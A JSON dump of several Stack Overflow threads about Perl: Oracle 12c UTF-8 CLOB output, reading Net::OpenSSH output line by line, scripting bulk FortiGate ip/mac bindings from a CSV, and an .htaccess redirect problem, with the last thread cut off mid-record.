[{"tags": ["perl", "oracle12c", "utf8-decode"], "comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457549657, "post_id": 35900154, "comment_id": 59460832, "body": "If those are your real database credentials, you might want to change them now."}, {"owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457550039, "post_id": 35900154, "comment_id": 59461082, "body": "Oops, removed the credentials. Thanks for alerting."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1457550930, "post_id": 35900154, "comment_id": 59461663, "body": "You should change them on your system, since they&#39;re still in the <a href=\"http://stackoverflow.com/posts/35900154/revisions\">edit history</a> and the unedited version of your question has almost certainly already been picked up by search engine spiders and copycat sites by now."}, {"owner": {"reputation": 30226, "user_id": 2107876, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/975e7190aac72397465126f04f46f3f6?s=128&d=identicon&r=PG", "display_name": "laune", "link": "https://stackoverflow.com/users/2107876/laune"}, "edited": false, "score": 0, "creation_date": 1457558983, "post_id": 35900154, "comment_id": 59466353, "body": "I admit that I&#39;ve just browsed the code without understanding much, but calling <code>Encode::decode_utf8</code> on a string and then again on the result doesn&#39;t seem appropriate?"}, {"owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "edited": false, "score": 0, "creation_date": 1457559623, "post_id": 35900154, "comment_id": 59466723, "body": "I had tried it without it and it still did not work. The input string is dObriy dEn/ vEcher (day/evening)   \u0414\u043e\u0431\u0440\u044b\u0439 \u0434\u0435\u043d\u044c/ \u0432\u0435\u0447\u0435\u0440! and the output is dObriy dEn/ vEcher (day/evening)   ?????? ????/ ?????!"}, {"owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "edited": false, "score": 0, "creation_date": 1457635851, "post_id": 35900154, "comment_id": 59508004, "body": "Solved it. The above code will work. All that is needed is the database connect part: my $dbh_eportal = DBI-&gt;connect($DSN,$DBUSER,$DBPW,{                         PrintError  =&gt; 0,                         RaiseError  =&gt; 1,                         AutoCommit  =&gt; 0,                         ora_charset =&gt; &#39;AL32UTF8&#39;,                     }) or $this-&gt;error(&quot;Problems with database connection"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1457718599, "post_id": 35900154, "comment_id": 59550016, "body": "Glad you solved your problem. Can you please post that as an answer so future visitors with the same problem can find it more easily?"}, {"owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "edited": false, "score": 0, "creation_date": 1458076586, "post_id": 35900154, "comment_id": 59695829, "body": "Posted the solution above. Thank you."}], "owner": {"reputation": 1, "user_id": 5531075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-X5YjdzAUZvg/AAAAAAAAAAI/AAAAAAAAAzs/BIHf9NxO80M/photo.jpg?sz=128", "display_name": "raghav sharma", "link": "https://stackoverflow.com/users/5531075/raghav-sharma"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 96, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1457549990, "creation_date": 1457549482, "last_edit_date": 1457549990, "question_id": 35900154, "link": "https://stackoverflow.com/questions/35900154/extracting-multilingual-data-from-oracle-12c-and-printing-it-using-perl", "title": "extracting multilingual data from oracle 12c and printing it using perl", "body": "<p>I am trying to extract data in different languages (russian, arabic etc) that is stored as clob in oracle 12 c database using perl. When I print it out using my perl script it comes out as '??' instead of the text stored in the database.</p>\n\n<p>Can anyone help me out with this problem.</p>\n\n<p>Thanks for your help.\nRaghav</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse CGI;\n  #use DBD;\n   use DBI;\n   use JSON::PP;\n      use Data::Dumper;\n    use Date::Manip;\n     use Encode;\n  use utf8;\n binmode STDOUT, \":utf8\";\n binmode STDERR, \":utf8\";\nbinmode STDIN,  \":utf8\";\n\nuse DBD::Oracle qw(:ora_types);\nuse lib \"/var/www/cgi-bin/ICE_LIBRARY/\";\nrequire '/var/www/cgi-bin/import_scripts/library/common_lib.pl';\nrequire \"/var/www/cgi-bin/import_scripts/library/script_log.pl\";\n\n#use database_conf;\n#my $db = new database_conf;\n\n#$Response-&gt;AddHeader(\"Content-Type\",\"text/html; charset=utf-8;\");\n\n#my $EP_dev_conn = $db-&gt;db_eportal_dev;\n\n\nmy ($DBNAME, $DBUSER, $DBPW, $DSN) = ('','','','');\n\n$DBNAME = 'DEV';\n$DBUSER = 'eee';\n$DBPW   = '1234'; ;\n$DSN   = \"dbi:Oracle:$DBNAME\";\n\n$ENV{NLS_LANG} = 'AMERICAN_AMERICA.AL32UTF8';\n#--- connect to DB\nmy $dbh_eportal = DBI-&gt;connect($DSN,$DBUSER,$DBPW,{\n                        PrintError  =&gt; 0,\n                        RaiseError  =&gt; 1,\n                        AutoCommit  =&gt; 0,\n                        ora_charset =&gt; 'AL32UTF8',\n                    }) or $this-&gt;error(\"Problems with database connection       $DBNAME: DBI::errstr\");\n    #$dbh_eportal-&gt;{LongReadLen} = $max_len;\n    #$dbh_eportal-&gt;{LongTruncOk} = 1; # this truncates data larger than 10MB\n\n\nmy $sql1 = qq|select note_description from apollo_case_info   where              case_number = '636763608'|;\n\nmy $a1 = $dbh_eportal-&gt;prepare($sql1);\n$a1-&gt;execute();\n\n   while ($audit_return = $a1-&gt;fetchrow_hashref('NAME_lc')){\n\n       my $note_desc = Encode::decode_utf8($audit_return-&gt;       {note_description});\n      #print(\"\\n$note_desc\");\n       $ustring2 = Encode::decode_utf8($note_desc);\n        print(\"\\n\\n$ustring2\");\n   }\n\n   #my $string = \"dObriy dEn/ vEcher (day/evening)   \u0414\u043e\u0431\u0440\u044b\u0439 \u0434\u0435\u043d\u044c/ \u0432\u0435\u0447\u0435\u0440!\";\n   #print(\"\\n$string\");\n</code></pre>\n"}, {"tags": ["perl", "ssh", "openssh"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1457543638, "post_id": 35895485, "comment_id": 59456885, "body": "I think you probably mean <a href=\"http://metacpan.org/module/Net::SSH::Expect\" rel=\"nofollow noreferrer\">Net::SSH::Expect</a>? You must always <i>copy</i> your code and data into a question"}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1457544499, "post_id": 35895485, "comment_id": 59457498, "body": "Fair point. Was more of a pointer than a solution"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1457544614, "post_id": 35895485, "comment_id": 59457592, "body": "@ChrisDoyle: If you think you have a solution then please post it. Comments are not the place for extracts or recitations. Also, which module are you talking about? As far as I can see there is nothing like that in the <a href=\"http://metacpan.org/module/Net::OpenSSH\" rel=\"nofollow noreferrer\">POD for <code>Net::OpenSSH</code></a>, and <code>Net::SSH::Except</code> doesn&#39;t exist"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1457544706, "post_id": 35895485, "comment_id": 59457661, "body": "@ChrisDoyle: Sorry Chris. I messed up my markdown and had to rewrite, so your answer now precedes my question. But what <i>is</i> the source of that &quot;cpan page&quot; extract?"}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1457545064, "post_id": 35895485, "comment_id": 59457887, "body": "I take your point, in the Net::OpenSSH there is a capture method."}], "answers": [{"tags": [], "owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "is_accepted": false, "score": 4, "last_activity_date": 1457545370, "creation_date": 1457545370, "answer_id": 35898814, "question_id": 35895485, "link": "https://stackoverflow.com/questions/35895485/how-do-you-read-every-line-of-the-output-using-perls-openssh/35898814#35898814", "title": "How do you read every line of the output using Perl&#39;s OpenSSH", "body": "<p>The Net::OpenSSH module provides a capture method which will capture all the output. If called in list context will return the output line by line </p>\n\n<pre><code>use strict;\nuse warnings;\nuse Net::OpenSSH;\n\nmy $host = \"localhost\";\nmy %opts = (\n        user =&gt; 'cdoyle',\n        password =&gt; 'thisisnottherealpassword',\n);\nmy $ssh = Net::OpenSSH-&gt;new($host, %opts);\nmy @output = $ssh-&gt;capture('ls -lrta');\n\nmy $count=0;\nforeach my $line (@output){\n        $count++;\n        print \"line $count $line\";\n}\n</code></pre>\n\n<p>gives the output</p>\n\n<pre><code>line 1 total 28\nline 2 -rw-------  1 cdoyle users   73 Jun 11  2015 .Xauthority\nline 3 -rw-------  1 cdoyle users  602 Jun 11  2015 .viminfo\nline 4 -rw-r--r--  1 cdoyle users   32 Jun 11  2015 .profile\nline 5 drwxr-xr-x  2 cdoyle users 4096 Jun 11  2015 .\nline 6 -rw-------  1 cdoyle users  682 Aug 20  2015 .sh_history\nline 7 drwxr-xr-x 32 root   root  4096 Feb 21 02:33 ..\n</code></pre>\n"}], "owner": {"reputation": 655, "user_id": 4557493, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/TzPf5.jpg?s=128&g=1", "display_name": "Jelani", "link": "https://stackoverflow.com/users/4557493/jelani"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 328, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1457545370, "creation_date": 1457536534, "last_edit_date": 1457544000, "question_id": 35895485, "link": "https://stackoverflow.com/questions/35895485/how-do-you-read-every-line-of-the-output-using-perls-openssh", "title": "How do you read every line of the output using Perl&#39;s OpenSSH", "body": "<p>Using Perl's <code>Net::SSH::Except</code>, there is a method called <code>read_line</code> which allows me to read every line of the output.</p>\n\n<p>I want to use <a href=\"http://metacpan.org/module/Net::OpenSSH\" rel=\"nofollow\"><code>Net::OpenSSH</code></a> but I can't find anything similar.</p>\n\n<p>How do you write this <code>SSH::Except</code> method using <code>OpenSSH</code>?</p>\n\n<pre><code>$ssh-&gt;send(\"ls\\r\\n\");\n\nwhile ( defined( $line = $ssh-&gt;read_line() ) {\n    # do something\n}\n</code></pre>\n"}, {"tags": ["python", "perl", "command-line-interface", "firewall"], "comments": [{"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1457530991, "post_id": 35892670, "comment_id": 59447275, "body": "Can you show the format of your CSV also."}, {"owner": {"reputation": 570, "user_id": 4915288, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/6296e64ee47e53ae7a4acdd326d0595a?s=128&d=identicon&r=PG&f=1", "display_name": "Lohith", "link": "https://stackoverflow.com/users/4915288/lohith"}, "reply_to_user": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 0, "creation_date": 1457538917, "post_id": 35892670, "comment_id": 59453447, "body": "i have added the format of CSV file"}], "answers": [{"comments": [{"owner": {"reputation": 570, "user_id": 4915288, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/6296e64ee47e53ae7a4acdd326d0595a?s=128&d=identicon&r=PG&f=1", "display_name": "Lohith", "link": "https://stackoverflow.com/users/4915288/lohith"}, "edited": false, "score": 0, "creation_date": 1457543242, "post_id": 35897309, "comment_id": 59456593, "body": "Thanks for your answer, it helped me a lot. can you just tell how i can run that code, i am not aware it."}, {"owner": {"reputation": 570, "user_id": 4915288, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/6296e64ee47e53ae7a4acdd326d0595a?s=128&d=identicon&r=PG&f=1", "display_name": "Lohith", "link": "https://stackoverflow.com/users/4915288/lohith"}, "edited": false, "score": 0, "creation_date": 1457544993, "post_id": 35897309, "comment_id": 59457845, "body": "I mean on windows how to execute that code to get that output and write it on to a separate output file."}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "reply_to_user": {"reputation": 570, "user_id": 4915288, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/6296e64ee47e53ae7a4acdd326d0595a?s=128&d=identicon&r=PG&f=1", "display_name": "Lohith", "link": "https://stackoverflow.com/users/4915288/lohith"}, "edited": false, "score": 0, "creation_date": 1457568884, "post_id": 35897309, "comment_id": 59470778, "body": "put the perl code in a file. and then call it with the csv file with all the data in it. <code>C:\\Users\\CD00119621&gt;perl ip_mac_setup.pl ip_mac_setup.csv</code>"}], "tags": [], "owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "is_accepted": true, "score": 1, "last_activity_date": 1457541199, "creation_date": 1457541199, "answer_id": 35897309, "question_id": 35892670, "link": "https://stackoverflow.com/questions/35892670/need-help-on-configuring-fortigate-firewall-cli-code-for-bulk-ipmacbinding-by-im/35897309#35897309", "title": "need help on configuring fortigate firewall CLI code for bulk ipmacbinding by importing a ip/mac entries list file", "body": "<p>I have never used the fortigate CLI so i will assume you know how it works and what to do with it. below is a small attempt that if it doesnt work exactly will hopefully put you on the correct trail. I have assumed that when you run the config command, the terminal normally waits for user input. so in this case the perl script will pipe in that input.</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $csv_file = shift;\nopen (my $cfh, '&lt;', $csv_file) or die \"Unable to open $csv_file: $!\";\nmy @headers = split (' ', &lt;$cfh&gt;);\n\nwhile(&lt;$cfh&gt;){\n  my %config;\n  my @data = split(' ');\n  @config{@headers}=@data;\n\n  open(my $firewall, '|-', 'config firewall ipmacbinding table') or die \"Unable to open 'config firewall ipmacbinding table': $!\";\n  print $firewall \"edit \",$config{'Index'},\"\\n\";\n  print $firewall \"set ip \",$config{'IP'},\"\\n\";\n  print $firewall \"set mac \",$config{'Mac'},\"\\n\";\n  print $firewall \"set name \",$config{'name'},\"\\n\";\n  print $firewall \"set status {enable}\\n\";\n  print $firewall \"end\\n\";\n  close $firewall;\n}\n</code></pre>\n\n<p>the above is written as an attempt to help you get started on how to make this work. as i said i have no experience with fotigate so you may need to tweek this a bit.</p>\n\n<p>If i chose to print this just to my terminal screen as output like this</p>\n\n<pre><code>use strict;\nuse warnings;\n\nmy $csv_file = shift;\nopen (my $cfh, '&lt;', $csv_file) or die \"Unable to open $csv_file: $!\";\nmy @headers = split (' ', &lt;$cfh&gt;);\n\nwhile(&lt;$cfh&gt;){\n        my %config;\n        my @data = split(' ');\n        @config{@headers}=@data;\n\n        #open(my $firewall, '|-', 'config firewall ipmacbinding table') or die \"Unable to open 'config firewall ipmacbinding table': $!\";\n        print  \"config firewall ipmacbinding table\\n\";\n        print  \"\\tedit \",$config{'Index'},\"\\n\";\n        print  \"\\tset ip \",$config{'IP'},\"\\n\";\n        print  \"\\tset mac \",$config{'Mac'},\"\\n\";\n        print  \"\\tset name \",$config{'name'},\"\\n\";\n        print  \"\\tset status {enable}\\n\";\n        print  \"end\\n\";\n        #close $firewall;\n}\n</code></pre>\n\n<p>it produces the following</p>\n\n<pre><code>config firewall ipmacbinding table\n        edit 1\n        set ip 10.10.17.1\n        set mac aa:bb:cc:00:11:22\n        set name first\n        set status {enable}\nend\nconfig firewall ipmacbinding table\n        edit 2\n        set ip 10.10.17.2\n        set mac cc:dd:ee:ff:22:33\n        set name second\n        set status {enable}\nend\nconfig firewall ipmacbinding table\n        edit 3\n        set ip 10.10.17.3\n        set mac 33:44:11:3f:00:88\n        set name third\n        set status {enable}\nend\n</code></pre>\n\n<p>hopefully this is enough for you to get started.</p>\n"}], "owner": {"reputation": 570, "user_id": 4915288, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/6296e64ee47e53ae7a4acdd326d0595a?s=128&d=identicon&r=PG&f=1", "display_name": "Lohith", "link": "https://stackoverflow.com/users/4915288/lohith"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1666, "favorite_count": 0, "accepted_answer_id": 35897309, "answer_count": 1, "score": 0, "last_activity_date": 1457541199, "creation_date": 1457529397, "last_edit_date": 1457539046, "question_id": 35892670, "link": "https://stackoverflow.com/questions/35892670/need-help-on-configuring-fortigate-firewall-cli-code-for-bulk-ipmacbinding-by-im", "title": "need help on configuring fortigate firewall CLI code for bulk ipmacbinding by importing a ip/mac entries list file", "body": "<p>i am facing a problem in ip/mac binding in fortigate 200d, the thing is i have a list of 3000 entries of IP/MAC addresses, i have kept them in a csv file.</p>\n\n<p>This is what i am looking for</p>\n\n<p>1.I want to write a code which can import that file</p>\n\n<p>2.I want execute this code snippet inside a loop until all entries are updated.</p>\n\n<pre><code>config firewall ipmacbinding table\nedit &lt;index_int&gt;\n    set ip &lt;address_ipv4&gt;\n    set mac &lt;address_hex&gt;\n    set name &lt;name_str&gt;\n    set status {enable}\nend\n</code></pre>\n\n<ol start=\"3\">\n<li><p>with the help of above code snippet each time i have to manually enter the the IP,MAC and Name values for 3000-times, instead i just want to import a file and from that file values should be added.</p></li>\n<li><p>In few places i came to know that it can achieved with the help of perl/python script but i am not aware of that.</p></li>\n</ol>\n\n<p>i googled but i didn't find anywhere about this information, so i hope that i would get help to get this task done.</p>\n\n<p>Thanks.</p>\n\n<p>Format of CSV File is</p>\n\n<pre><code>Index   IP       Mac                name\n1   10.10.17.1  aa:bb:cc:00:11:22   first\n2   10.10.17.2  cc:dd:ee:ff:22:33   second\n3   10.10.17.3  33:44:11:3f:00:88   third\n</code></pre>\n\n<p><a href=\"http://i.stack.imgur.com/tj4VP.jpg\" rel=\"nofollow\">Formal of CSV File</a></p>\n"}, {"tags": ["apache", "perl", ".htaccess", "redirect", "mod-rewrite"], "answers": [{"comments": [{"owner": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "edited": false, "score": 0, "creation_date": 1457532927, "post_id": 35892435, "comment_id": 59448678, "body": "Hi Borodin, still no luck ! I used both [L,PT] and [PT] but did not notice any change. thanks."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "edited": false, "score": 0, "creation_date": 1457534809, "post_id": 35892435, "comment_id": 59450095, "body": "How are you testing this? You talk about some Perl code. Please may we see what that is doing?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "edited": false, "score": 0, "creation_date": 1457534996, "post_id": 35892435, "comment_id": 59450240, "body": "<a href=\"http://martinmelin.se/rewrite-rule-tester/\" rel=\"nofollow noreferrer\"><b><i>This</i></b></a> may be useful, but I can&#39;t recommend it first-hand"}, {"owner": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "edited": false, "score": 0, "creation_date": 1457535970, "post_id": 35892435, "comment_id": 59451033, "body": "Hi, I have added the Perl code editing my first post, please have a look."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 2, "last_activity_date": 1457528675, "creation_date": 1457528675, "answer_id": 35892435, "question_id": 35889367, "link": "https://stackoverflow.com/questions/35889367/htaccess-redirection-not-working-on-apache-2-2-15/35892435#35892435", "title": ".htaccess redirection not working on Apache/2.2.15", "body": "<p>You're just missing the <code>[PT]</code> <em>passthrough</em> flag, which resubmits the modified URL to the mapping process</p>\n\n<p>Without it the result is assumed to be a file path, in which context <code>?NAME=delivery</code>makes no sense</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457610531, "post_id": 35915346, "comment_id": 59489720, "body": "The latest version of <a href=\"http://metacpan.org/module/CGI\" rel=\"nofollow noreferrer\">CGI</a> is 4.27. Where did you get v5.6.1 and v5.14.1 from? Also, I don&#39;t see how the module can have any effect on Apache&#39;s rewrite engine. However, if you have found a solution that works for you then very well done"}, {"owner": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1457672819, "post_id": 35915346, "comment_id": 59522488, "body": "Hi Borodin, I have added another answer for your query. Thanks a lot."}], "tags": [], "owner": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "is_accepted": false, "score": 1, "last_activity_date": 1457609692, "creation_date": 1457609692, "answer_id": 35915346, "question_id": 35889367, "link": "https://stackoverflow.com/questions/35889367/htaccess-redirection-not-working-on-apache-2-2-15/35915346#35915346", "title": ".htaccess redirection not working on Apache/2.2.15", "body": "<p>I checked the CGI.pm version that is being used in my system. \nThe version is 5.14.1 where some of the sub routines got changed than what\nthey were in earlier version (for example : 5.6.1).</p>\n\n<p>Due to the change of sub routine sub url in CGI.pm, the output is coming like that which I do not want.</p>\n\n<p>It is not a .htaccess problem, I think.</p>\n\n<p>Thanks as always for your help.</p>\n"}, {"tags": [], "owner": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "is_accepted": false, "score": 0, "last_activity_date": 1457672779, "creation_date": 1457672779, "answer_id": 35932645, "question_id": 35889367, "link": "https://stackoverflow.com/questions/35889367/htaccess-redirection-not-working-on-apache-2-2-15/35932645#35932645", "title": ".htaccess redirection not working on Apache/2.2.15", "body": "<p>My apologies. I mentioned the Perl version as 5.14.1.\nThe CGI.pm version which is giving me the unexpected output is 3.52 and the earlier CGI.pm version which is giving the expected output was 2.752.</p>\n\n<p>Quite obviously, the CGI module has undergone several changes in between 2.752 and 3.52. Anybody interested, can have a look here <a href=\"http://cpansearch.perl.org/src/MARKSTOS/CGI.pm-3.52/Changes\" rel=\"nofollow\">http://cpansearch.perl.org/src/MARKSTOS/CGI.pm-3.52/Changes</a></p>\n"}], "owner": {"reputation": 680, "user_id": 6038082, "user_type": "registered", "accept_rate": 84, "profile_image": "https://www.gravatar.com/avatar/354cfd22c3080b02a5ae540f5b5abfc2?s=128&d=identicon&r=PG&f=1", "display_name": "A.G.Progm.Enthusiast", "link": "https://stackoverflow.com/users/6038082/a-g-progm-enthusiast"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 139, "favorite_count": 0, "accepted_answer_id": 35892435, "answer_count": 3, "score": 1, "last_activity_date": 1457672779, "creation_date": 1457520394, "last_edit_date": 1457535924, "question_id": 35889367, "link": 